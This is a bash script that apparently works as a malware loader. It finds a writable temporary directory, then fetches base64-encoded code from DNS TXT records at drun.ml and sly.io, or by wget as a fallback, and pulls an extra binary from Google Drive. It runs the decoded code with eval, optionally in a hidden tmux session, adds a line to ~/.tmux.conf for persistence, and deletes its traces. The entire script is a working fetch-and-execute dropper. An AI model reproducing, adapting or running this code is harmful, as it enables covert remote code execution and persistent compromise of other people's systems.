#!/bin/bash

TMX=${TMX:-0}

for ph in {/tmp,/dev/shm,/run,~/,/var/tmp,/var/cache}; do
    rm -f $ph/.xtst
    touch $ph/.xtst &&
        chmod +x $ph/.xtst &&
        rm -f $ph/.xtst &&
        cd $ph &&
    break
done
{ type base64 &>/dev/null && b64=base64; } ||
        { type openssl &>/dev/null && b64="openssl enc -base64 "; } ||
                { sleep 3 && echo "no encoding tools availables!" exit 1; }

parselauncher() {
    ## strip truncated messages
    launcher=$(echo "${launcher}" | while read l; do [ "${l/\;\;}" = "${l}" ] && echo "$l" && break; done)
    ## dns records escaping related
    launcher=${launcher//\ }
    launcher=${launcher//\"}
    ## fix for freedns TXT submission
    [ "$launcher" != "${launcher%eql}" ] && launcher="${launcher%eql}="
    launcher=$(echo "$launcher" | $b64 -d)
}

endpoints() {
    script_ep=plo.sly.io
    pl_token_ep=pl.drun.ml
    # script_url=$(dig txt latest.drun.ml +short)
    launcher=$(dig txt $script_ep  +short @8.8.8.8)
    parselauncher
    pl_token=$(dig txt $pl_token_ep +short @8.8.8.8)
    pl_token=${pl_token//\"}
}

endpoints_fallback() {
    script_url=latest.drun.ml
    launcher=$(wget -qO- "$script_url" | $b64 -d)
    parselauncher
    pl_token=$(wget -S https://pl.drun.ml 2>&1 | grep -m1 'Location') ## m1 also important to stop wget
    pl_token=${pl_token/*\/}
}

getdig() {
    fileid="1WiXVJgwjkmnwpMGkjT8cUp0RDeuPILwf"
    filename="dig"
    wget --save-cookies ./cookie \
         -q "https://drive.google.com/uc?export=download&id=${fileid}" > /dev/null
    wget --load-cookies ./cookie \
         "https://drive.google.com/uc?export=download&confirm=`awk '/download/ {print $NF}' ./cookie`&id=${fileid}" \
         -O ${filename}
    chmod +x dig
}

if type dig &>/dev/null; then
    endpoints
else
    getdig && endpoints ||
            endpoints_fallback
fi

echo "export \

">env.sh

if [ "$TMX" = 1 ]; then
    tmx_init="new -s init sleep 10"
    grep -q "$tmx_init" ~/.tmux.conf || echo "$tmx_init" >> ~/.tmux.conf
    tmux start-server
    tmux set -g default-shell /bin/bash

    tmux new -d -s crt 'eval '"$launcher"
    (sleep 3 && rm env.sh) &>/dev/null &
else
    eval "$launcher"
    # wait %1
fi
